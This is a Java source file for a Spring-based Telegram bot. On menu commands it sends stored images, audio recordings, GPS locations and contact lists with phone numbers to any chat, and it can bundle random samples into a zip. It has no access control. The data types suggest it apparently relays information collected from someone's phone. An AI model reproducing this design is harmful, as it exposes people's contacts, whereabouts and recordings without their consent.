package com.example.demoCode.telegram;


import com.example.demoCode.entity.Contacts;
import com.example.demoCode.entity.GPSInfo;
import com.example.demoCode.entity.Images;
import com.example.demoCode.entity.Records;
import com.example.demoCode.service.ContactsService;
import com.example.demoCode.service.GpsService;
import com.example.demoCode.service.ImageService;
import com.example.demoCode.service.RecordService;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.ClassPathResource;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.stereotype.Component;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.send.*;
import org.telegram.telegrambots.meta.api.objects.InputFile;
import org.telegram.telegrambots.meta.api.objects.Update;

import org.telegram.telegrambots.meta.api.objects.replykeyboard.ReplyKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardButton;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardRow;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.*;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;


@Component
@RequiredArgsConstructor
@EnableAsync(proxyTargetClass = true)
public class MyTelegramBot extends TelegramLongPollingBot {


    @Value("${telegram.bot.username}")
    private String botUsername;
    @Value("${telegram.bot.token}")
    private String botToken;


    private final ContactsService contactsService;
    private final ImageService imageService;
    private final RecordService recordService;
    private final GpsService gpsService;


    @Override
    public String getBotUsername() {
        return botUsername;
    }

    @Override
    public String getBotToken() {
        return botToken;
    }


    //---
    @Override
    public void onUpdateReceived(Update update) {
        if (update.hasMessage() && update.getMessage().hasText()) {
            String messageText = update.getMessage().getText();
            long chatId = update.getMessage().getChatId();

            switch (messageText) {
                case "/start" -> sendMenu(chatId);
                case "Get All Images" -> sendAllImages(chatId);
                case "Get All Records" -> sendAllAudio(chatId);
                case "Get All Gps Information" -> sendGPS(chatId);
                case "Generate Zip" -> getZipFile(chatId);
                default -> sendMessage(chatId, "Invalid command. Please choose an option from the menu.");
            }
        }
    }


    //---Menu List---
    private void sendMenu(long chatId) {
        SendMessage message = new SendMessage();
        message.setChatId(chatId);
        message.setText("Please choose an option:");

        ReplyKeyboardMarkup keyboardMarkup = new ReplyKeyboardMarkup();
        List<KeyboardRow> keyboard = new ArrayList<>();

        KeyboardRow row = new KeyboardRow();
        row.add(new KeyboardButton("Get All Images"));
        row.add(new KeyboardButton("Get All Records"));
        row.add(new KeyboardButton("Get All Gps Information"));
        row.add(new KeyboardButton("Generate Zip"));
        keyboard.add(row);

        keyboardMarkup.setKeyboard(keyboard);
        message.setReplyMarkup(keyboardMarkup);

        try {
            execute(message);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    //---Message---
    private void sendMessage(long chatId, String text) {
        SendMessage message = new SendMessage();
        message.setChatId(chatId);
        message.setText(text);

        try {
            execute(message);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    //---Send all images---
    @Async
    protected void sendAllImages(long chatId) {
        CompletableFuture.runAsync(() -> {
            List<Images> imagesList = imageService.getAllImageNames();
            for (Images images : imagesList) {
                String imagePath = "static/images/" + images.getFile();
                SendPhoto photo = new SendPhoto();
                photo.setChatId(chatId);
                try {
                    File file = new ClassPathResource(imagePath).getFile();
                    InputFile inputFile = new InputFile(file);
                    photo.setPhoto(inputFile);
                    execute(photo);
                } catch (IOException | TelegramApiException e) {
                    e.printStackTrace();
                }
            }
        });
    }


    //---Send all records---
    @Async
    protected void sendAllAudio(long chatId) {
        CompletableFuture.runAsync(() -> {
            List<Records> recordList = recordService.getAllRecordNames();
            for (Records records : recordList) {
                String recordPath = "static/records/" + records.getFile();
                SendAudio audio = new SendAudio();
                audio.setChatId(chatId);
                try {
                    File file = new ClassPathResource(recordPath).getFile();
                    InputFile inputFile = new InputFile(file);
                    audio.setAudio(inputFile);
                    execute(audio);
                } catch (IOException | TelegramApiException e) {
                    e.printStackTrace();
                }
            }
        });
    }


    //---Send all gps info
    @Async
    protected void sendGPS(long chatId) {
        CompletableFuture.runAsync(() -> {
            List<GPSInfo> gpsList = gpsService.getAllGPSInfo();


            for (GPSInfo gpsInfo : gpsList) {
                Double lat = gpsInfo.getLat();
                Double lon = gpsInfo.getLon();
                Integer acc = gpsInfo.getAcc();

                try {
                    SendLocation location = new SendLocation();
                    location.setChatId(chatId);
                    location.setHorizontalAccuracy(Double.valueOf(acc));
                    location.setLatitude(lat);
                    location.setLongitude(lon);
                    execute(location);
                } catch (TelegramApiException e) {
                    e.printStackTrace();
                }
            }
        });
    }


    //--- Generate Zip
    @Async
    protected void getZipFile(long chatId) {
        CompletableFuture.runAsync(() -> {
            List<Contacts> contactsList = contactsService.getRandomContacts();
            List<Images> imagesList = imageService.getRandomImages();
            List<Records> recordsList = recordService.getRandomRecords();
            List<GPSInfo> gpsList = gpsService.getRandomGps();

            List<String> imagePaths = new ArrayList<>();
            List<String> recordePaths = new ArrayList<>();

            for (Images images : imagesList) {
                imagePaths.add("static/images/" + images.getFile());
            }
            for (Records records : recordsList) {
                recordePaths.add("static/records/" + records.getFile());
            }


            String zipFileName = "file.zip";
            try (FileOutputStream fos = new FileOutputStream(zipFileName);
                 ZipOutputStream zos = new ZipOutputStream(fos)) {

                String jsonFileName = "data.json";
                writeDataToJsonFile(contactsList, imagesList, gpsList, recordsList, jsonFileName);
                addFileToZip(jsonFileName, zos);

                addFilesToZip(imagePaths, zos, chatId);
                addFilesToZip(recordePaths, zos, chatId);


            } catch (IOException e) {
                e.printStackTrace();
            }


            File zipFile = new File(zipFileName);
            if (zipFile.exists()) {
                SendDocument document = new SendDocument();
                document.setChatId(chatId);
                InputFile inputFile = new InputFile(zipFile);
                document.setDocument(inputFile);

                try {
                    execute(document);

                } catch (TelegramApiException e) {
                    e.printStackTrace();
                }
            }
        });

    }


    //---Writing randomly selected info to JSON file---
    private void writeDataToJsonFile(
            List<Contacts> contactsList, List<Images> imagesList,
            List<GPSInfo> gpsInfoList, List<Records> recordsList, String jsonFilePath) throws IOException {
        Map<String, Object> data = new HashMap<>();

        List<Map<String, Object>> contactDataList = new ArrayList<>();

        for (Contacts contact : contactsList) {
            Map<String, Object> contactData = getStringObjectMap(contact);

            contactDataList.add(contactData);
        }

        data.put("contacts", contactDataList);
        data.put("images", imagesList);
        data.put("records", recordsList);
        data.put("gps_info", gpsInfoList);

        ObjectMapper mapper = new ObjectMapper();
        mapper.writeValue(new File(jsonFilePath), data);
    }


    //---Numbers turn over array---
    private static Map<String, Object> getStringObjectMap(Contacts contact) {
        Map<String, Object> contactData = new HashMap<>();
        contactData.put("id", contact.getId());
        contactData.put("name", contact.getName());
        contactData.put("time_modified", contact.getTime_Modified());

        String numbersString = contact.getNumbers();
        List<String> numbersList = Arrays.asList
                (numbersString.replace("[", "").replace("]", "")
                        .split(","));
        contactData.put("numbers", numbersList);
        return contactData;
    }


    //--- JSON file writes to zip
    private void addFileToZip(String filePath, ZipOutputStream zos) throws IOException {
        File file = new File(filePath);
        try (FileInputStream fis = new FileInputStream(file)) {
            ZipEntry zipEntry = new ZipEntry(file.getName());
            zos.putNextEntry(zipEntry);
            byte[] buffer = new byte[1024];
            int length;
            while ((length = fis.read(buffer)) > 0) {
                zos.write(buffer, 0, length);
            }
            zos.closeEntry();
        }
    }


    //--- Image and record write to zip
    private void addFilesToZip(List<String> filePaths, ZipOutputStream zos, long chatId) throws IOException {

        for (String recordsPath : filePaths) {

            SendDocument document = new SendDocument();
            document.setChatId(chatId);

            try {
                File file = new ClassPathResource(recordsPath).getFile();
                InputFile inputFile = new InputFile(file);
                document.setDocument(inputFile);


                try (FileInputStream fis = new FileInputStream(file)) {
                    ZipEntry zipEntry = new ZipEntry(file.getName());
                    zos.putNextEntry(zipEntry);
                    byte[] buffer = new byte[1024];
                    int length;
                    while ((length = fis.read(buffer)) > 0) {
                        zos.write(buffer, 0, length);
                    }
                    zos.closeEntry();
                }

            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }
}
